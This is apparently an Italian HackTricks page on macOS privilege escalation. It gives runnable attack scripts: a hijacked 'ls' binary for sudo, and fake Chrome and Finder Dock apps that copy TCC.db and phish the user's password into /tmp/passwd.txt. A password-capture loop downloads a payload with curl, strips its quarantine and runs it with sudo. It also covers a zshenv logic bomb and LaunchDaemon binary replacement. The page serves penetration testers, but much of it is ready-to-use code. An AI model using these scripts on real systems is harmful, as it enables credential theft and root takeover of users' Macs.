# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se stai cercando informazioni sul TCC privilege escalation, vai a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Molte tecniche di privilege escalation che interessano Linux o altri sistemi Unix-like si applicano anche a macOS. Vedi:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interazione con l'utente

### Sudo Hijacking

Puoi trovare la tecnica originale [Sudo Hijacking nel post Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Tuttavia, macOS **mantiene** il **`PATH`** dell'utente quando esegue **`sudo`**. Ciò significa che un altro modo per ottenere questo attacco sarebbe **hijackare altri binari** che la vittima eseguirà comunque quando **esegue sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Nota che un utente che utilizza il terminale avrà molto probabilmente **Homebrew installato**. È quindi possibile dirottare i binary in **`/opt/homebrew/bin`**.

### Dock Impersonation

Utilizzando un po' di **social engineering**, potresti **impersonare, ad esempio, Google Chrome** all'interno del Dock ed eseguire effettivamente il tuo script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Alcuni suggerimenti:

- Controlla nel Dock se è presente Chrome e, in tal caso, **rimuovi** quella voce e **aggiungi** la voce di **Chrome falsa** nella stessa posizione nell'array del Dock.

<details>
<summary>Script per l'impersonificazione di Chrome nel Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Alcuni suggerimenti:

- **Non puoi rimuovere Finder dal Dock**, quindi, se vuoi aggiungerlo al Dock, puoi posizionare il Finder falso proprio accanto a quello reale. Per farlo devi **aggiungere la voce del Finder falso all'inizio dell'array del Dock**.
- Un'altra opzione è non inserirlo nel Dock e limitarsi ad aprirlo: "Finder chiede di controllare Finder" non è poi così strano.
- Un'altra opzione per **escalare a root senza chiedere** la password mostrando una finestra orribile consiste nel fare in modo che Finder chieda realmente la password per eseguire un'azione privilegiata:
- Chiedi a Finder di copiare in **`/etc/pam.d`** un nuovo file **`sudo`** (il prompt che chiede la password indicherà che "Finder vuole copiare sudo")
- Chiedi a Finder di copiare un nuovo **Authorization Plugin** (puoi controllare il nome del file, così il prompt che chiede la password indicherà che "Finder vuole copiare Finder.bundle")

<details>
<summary>Script di impersonificazione del Dock di Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Il malware abusa frequentemente dell'interazione dell'utente per **catturare una password compatibile con sudo** e riutilizzarla programmaticamente. Un flusso comune:

1. Identificare l'utente connesso con `whoami`.
2. **Ripetere i prompt della password** finché `dscl . -authonly "$user" "$pw"` non restituisce un esito positivo.
3. Memorizzare la credenziale nella cache (ad esempio, `/tmp/.pass`) ed eseguire azioni privilegiate con `sudo -S` (password tramite stdin).

Esempio di catena minima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La password rubata può quindi essere riutilizzata per **rimuovere la quarantena di Gatekeeper con `xattr -c`**, copiare LaunchDaemons o altri file privilegiati ed eseguire ulteriori fasi in modo non interattivo.<sup>[[1]](#references)</sup>

## Vettori specifici delle versioni più recenti di macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` deprecato ancora utilizzabile

`AuthorizationExecuteWithPrivileges` è stato deprecato nella versione 10.7, ma **funziona ancora su Sonoma/Sequoia**. Molti updater commerciali invocano `/usr/libexec/security_authtrampoline` con un percorso non attendibile. Se il binary di destinazione è scrivibile dall'utente, puoi inserire un trojan e sfruttare il prompt legittimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combina con i **masquerading tricks sopra** per presentare una finestra di dialogo della password credibile.


### Helper privilegiato / triage XPC

Molti privescs moderni di terze parti per macOS seguono lo stesso pattern: un **LaunchDaemon root** espone un **servizio Mach/XPC** da **`/Library/PrivilegedHelperTools`**, quindi l'helper non **valida il client**, lo valida **troppo tardi** (PID race) oppure espone un **metodo root** che utilizza un **percorso/script controllato dall'utente**. Questa è la classe di bug alla base di molti bug recenti negli helper dei client VPN, dei game launcher e degli updater.<sup>[[2]](#references)</sup>

Checklist di triage rapida:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Presta particolare attenzione agli helper che:

- continuano ad accettare richieste **dopo la disinstallazione** perché il job è rimasto caricato in `launchd`
- eseguono script o leggono la configurazione da **`/Applications/...`** o da altri percorsi scrivibili da utenti non root
- si basano sulla validazione dei peer **basata sul PID** o **solo sul bundle-id**, che potrebbe essere soggetta a race condition

Per maggiori dettagli sui bug di autorizzazione degli helper, consulta [questa pagina](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Ereditarietà dell'ambiente degli script di PackageKit (CVE-2024-27822)

Fino alla correzione da parte di Apple in **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, le installazioni avviate dall'utente tramite **`Installer.app`** / **`PackageKit.framework`** potevano eseguire gli **script PKG come root all'interno dell'ambiente dell'utente corrente**. Ciò significa che un pacchetto che utilizzava **`#!/bin/zsh`** avrebbe caricato **`~/.zshenv`** dell'attacker ed eseguito il contenuto come **root** quando la vittima installava il pacchetto.<sup>[[3]](#references)</sup>

Questo è particolarmente interessante come **logic bomb**: è sufficiente ottenere un foothold nell'account dell'utente e disporre di un file di startup della shell scrivibile, quindi attendere che l'utente esegua qualsiasi installer vulnerabile **basato su zsh**. In generale, questo non si applica alle distribuzioni **MDM/Munki**, perché vengono eseguite all'interno dell'ambiente dell'utente root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se vuoi approfondire l'abuso specifico degli Installer, consulta anche [questa pagina](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Collisione della destinazione dell'Installer tramite `.localized`

Alcuni Installer di terze parti registrano un LaunchDaemon root il cui eseguibile è indicato tramite un percorso fisso all'interno di `/Applications/Target.app`. Se un attacker può creare prima quel bundle con un **bundle identifier diverso**, Installer potrebbe preservare l'esca e posizionare l'app reale in `/Applications/Target.localized/Target.app`. Il daemon continua a puntare al percorso originale. Di conseguenza, un eseguibile controllato dall'attacker all'interno del bundle esca può essere eseguito successivamente come root.<sup>[[8]](#references)</sup>

Le condizioni preliminari importanti sono:<sup>[[8]](#references)</sup>

1. L'attacker può creare o controllare il percorso dell'applicazione previsto.
2. Il package non rimuove il bundle in conflitto.
3. Il job privilegiato usa un percorso hard-coded all'interno di quel bundle.
4. L'utente o un workflow MDM installa il package e registra il job.

Cerca i bundle ricollocati e poi esamina i target dei LaunchDaemon con il loop di enumerazione nella sezione successiva:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Un installer più sicuro risolve la posizione finale del bundle e mantiene gli eseguibili privilegiati in una posizione di proprietà di root, come `/Library/PrivilegedHelperTools`. Dovrebbe inoltre verificare la proprietà e la firma del codice prima di registrare o avviare il job.<sup>[[8]](#references)</sup>

### Hijacking di un target scrivibile di LaunchDaemon

Un plist di LaunchDaemon può essere di proprietà di root mentre il suo `Program` o il primo elemento di `ProgramArguments` punta a una directory scrivibile dall'utente. Controlla l'**intero percorso**, non solo i permessi dell'eseguibile. Se la directory padre è scrivibile, un attacker può rinominare un eseguibile di proprietà di root e creare un sostituto nello stesso percorso. Il sostituto viene eseguito come root alla successiva esecuzione del job. È sufficiente un riavvio o un normale riavvio del servizio. L'attacker non ha bisogno dell'autorizzazione per eseguire `launchctl bootstrap` nel dominio di sistema.<sup>[[7]](#references)</sup>

Enumera prima ogni target e la relativa directory padre immediata:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Quando il file o la directory padre è scrivibile, conserva il binario originale e sostituisci il percorso con un payload eseguibile. Quindi attendi che il daemon già caricato si riavvii.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Il percorso vulnerabile `kauth_cred_proc_update` aggiornava `proc_ro.p_ucred` con l'API non atomica `zalloc_ro_mut`, mentre i lettori SMR caricavano il puntatore senza un lock. Il trigger pubblico utilizza un binary setgid appositamente preparato. Un thread alterna continuamente gli ID dei gruppi reali ed effettivi, mentre un altro thread entra ripetutamente in una syscall come `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Trattalo come una **race primitive**, non come un exploit root già pronto. Il PoC pubblicato dimostra un puntatore alle credenziali troncato. Spesso termina con un kernel panic. Il ricercatore ha riprodotto la corruzione solo su Intel e non ha fornito un controllo deterministico dell'oggetto credenziali risultante. Apple ha modificato l'aggiornamento introducendo uno scambio atomico del puntatore in macOS 15.3.<sup>[[4]](#references)</sup>

### Bypass di SIP tramite Migration assistant ("Migraine", CVE-2023-32369)

Se disponi già di root, SIP continua a bloccare le scritture nelle posizioni di sistema. Il bug **Migraine** sfrutta l'entitlement di Migration Assistant `com.apple.rootless.install.heritable` per generare un processo figlio che eredita il bypass di SIP e sovrascrive percorsi protetti (ad esempio `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La catena:

1. Ottenere root su un sistema in esecuzione.
2. Attivare `systemmigrationd` con uno stato creato ad hoc per eseguire un binary controllato dall'attaccante.
3. Usare l'entitlement ereditato per modificare i file protetti da SIP, mantenendo la persistenza anche dopo il reboot.

### NSPredicate/XPC expression smuggling (classe di bug CVE-2023-23530/23531)

Diversi daemon Apple accettano oggetti **NSPredicate** tramite XPC e validano solo il campo `expressionType`, controllabile dall'attaccante. Creando un predicate che valuta selector arbitrari, puoi ottenere **code execution nei servizi XPC root/system** (ad esempio `coreduetd`, `contextstored`). Se combinato con un iniziale sandbox escape da un'app, questo consente una **privilege escalation senza prompt per l'utente**. Cerca endpoint XPC che deserializzano predicate e non dispongono di un visitor robusto.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass e privilege escalation

**Qualsiasi utente** (anche quelli senza privilegi) può creare e montare uno snapshot di Time Machine con `-o noowners` e **accedere a TUTTI i file** di quello snapshot, aggirando i controlli di ownership sul volume live. L'unico privilegio necessario è che l'applicazione utilizzata (come `Terminal`) disponga di **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

I comandi e la spiegazione completa sono disponibili nella pagina sui TCC bypass:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informazioni sensibili

Questo può essere utile per effettuare una privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - il 2025, l'anno dell'Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: privilege escalation locale di AWS Client VPN per macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: privilege escalation di macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Bypass di SIP "Migraine" di Microsoft (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Una nuova classe di bug di privilege escalation su macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Hijacking di LaunchDaemon: privilege escalation e persistenza tramite permessi non sicuri sulle cartelle](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE su macOS tramite la directory .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
